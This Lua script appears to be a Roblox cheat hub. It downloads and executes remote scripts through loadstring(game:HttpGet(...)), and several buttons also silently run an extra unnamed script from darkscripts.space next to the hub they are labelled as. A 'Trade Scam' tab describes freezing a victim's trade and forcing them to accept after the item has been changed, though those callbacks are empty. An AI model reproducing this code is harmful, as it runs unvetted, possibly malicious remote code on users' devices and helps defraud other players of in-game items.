local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "MRX ScriptHub", HidePremium = true, SaveConfig = false, ConfigFolder = "OrionTest"})


  --  _____                    
 --  |  ___|_ _ _ __ _ __ ___  
 --  | |_ / _` | '__| '_ ` _ \ 
 --  |  _| (_| | |  | | | | | |
 --  |_|  \__,_|_|  |_| |_| |_|

local Tab = Window:MakeTab({
	Name = "Farm",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "HoHo",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
  	end    
})

Tab:AddButton({
	Name = "CokkaHub",
	Callback = function()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua")()
  	end    
})

Tab:AddButton({
	Name = "SpeedHub",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
    loadstring(game:HttpGet('https://darkscripts.space/scripts/ffb0cbae-54c3-4037-8ac1-4c43590d6de4_1153332469823709294.lua',true))()
  	end    
})

Tab:AddButton({
	Name = "BananaHub",
	Callback = function()
    repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
getgenv().Key = "PASTE_KEY_HERE"
loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()
-- Get Key : https://ads.luarmor.net/get_key?for=VHFslhWdrPey
loadstring(game:HttpGet('https://darkscripts.space/scripts/ffb0cbae-54c3-4037-8ac1-4c43590d6de4_1153332469823709294.lua',true))()
  	end    
})

Tab:AddButton({
	Name = "RaitoHub",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
    loadstring(game:HttpGet('https://darkscripts.space/scripts/ffb0cbae-54c3-4037-8ac1-4c43590d6de4_1153332469823709294.lua',true))()
  	end    
})


local Tab = Window:MakeTab({
	Name = "Trade Scam",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "Freeze Trade",
	Callback = function()
    
  	end    
})

Tab:AddButton({
	Name = "Force Ready / Auto Ready",
	Callback = function()
    
  	end    
})

Tab:AddParagraph("Freeze Trade","Freeze Trade will make the victim not able to cancel the trade and cannot do anything")
Tab:AddParagraph("Force Ready / Auto Ready","Force Ready / Auto Ready will make your victim press accept or ready even if you changed the fruit")
Tab:AddParagraph("Note","Use Freeze Trade first before Force Ready / Auto Ready")
